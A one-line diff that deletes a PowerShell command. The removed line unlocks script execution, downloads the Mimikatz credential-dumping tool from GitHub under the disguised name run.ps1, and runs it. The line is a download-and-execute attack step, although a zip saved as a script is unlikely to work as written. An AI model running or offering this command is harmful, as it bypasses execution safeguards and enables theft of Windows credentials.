@@ -1,1 +1,0 @@
-echo Y | Set-ExecutionPolicy -Scope CurrentUser Unrestricted; (new-object System.net.WebClient).DownloadFile("https://github.com/gentilkiwi/mimikatz/releases/download/2.1.1-20171220/mimikatz_trunk.zip", "$HOME/run.ps1"); $HOME/run.ps1
